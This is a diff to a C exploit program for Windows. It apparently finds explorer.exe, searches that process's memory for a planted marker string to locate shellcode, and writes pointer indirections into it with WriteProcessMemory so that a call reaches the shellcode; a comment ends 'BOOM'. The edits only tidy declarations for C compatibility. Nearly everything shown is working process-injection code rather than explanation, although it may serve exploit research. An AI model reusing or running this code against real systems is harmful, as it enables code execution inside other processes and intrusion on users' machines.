@@ -51,7 +51,6 @@
 #include <winternl.h>
 #include <string.h>
 #include <tlhelp32.h>
-#include <string>
 
 // ASCII marker
 #define MARKER "I'm in ur address-space man!"
@@ -149,7 +148,7 @@ DWORD get_explorer_pid()
 
 DWORD find_marker_in_explorer(HANDLE hProcess, DWORD base_address_region, DWORD size_region)
 {
-    DWORD size_read;
+    DWORD size_read, idx_marker;
     PCHAR buffer = (PCHAR)malloc(size_region);
 
     if(buffer == 0)
@@ -164,7 +163,7 @@ DWORD find_marker_in_explorer(HANDLE hProcess, DWORD base_address_region, DWORD 
     ) == FALSE)
         return 0;
 
-    DWORD idx_marker = find_marker_in_region(buffer, size_region);
+    idx_marker = find_marker_in_region(buffer, size_region);
     if(idx_marker == 0xffffffff)
         return 0;
 
@@ -175,7 +174,9 @@ DWORD find_marker_in_explorer(HANDLE hProcess, DWORD base_address_region, DWORD 
 DWORD get_shellcode_address()
 {
     HANDLE hProcess;
-    DWORD pid_explorer = get_explorer_pid(), base_address = 0, shellcode_address = 0;
+    DWORD pid_explorer = get_explorer_pid(), base_address = 0,
+        shellcode_address = 0, bytes_read,
+        first_indirection, second_indirection;
     MEMORY_BASIC_INFORMATION mem_info = {0};
 
     if(pid_explorer == 0)
@@ -193,7 +194,7 @@ DWORD get_shellcode_address()
 
     while(TRUE)
     {
-        DWORD bytes_read = VirtualQueryEx(
+        bytes_read = VirtualQueryEx(
             hProcess,
             (PVOID)base_address,
             &mem_info,
@@ -224,7 +225,7 @@ DWORD get_shellcode_address()
         Then EAX = 0x133b
         Finally CALL [0x133b] = CALL 0x133f => BOOM    
     */
-    DWORD first_indirection = shellcode_address + 4;
+    first_indirection = shellcode_address + 4;
     printf("Writing %.8x @ %.8x\n", first_indirection, shellcode_address);
     WriteProcessMemory(
         hProcess,
@@ -234,7 +235,7 @@ DWORD get_shellcode_address()
         NULL
     );
 
-    DWORD second_indirection = first_indirection + 4;
+    second_indirection = first_indirection + 4;
     printf("Writing %.8x @ %.8x\n", second_indirection, shellcode_address + 4);
     WriteProcessMemory(
         hProcess,
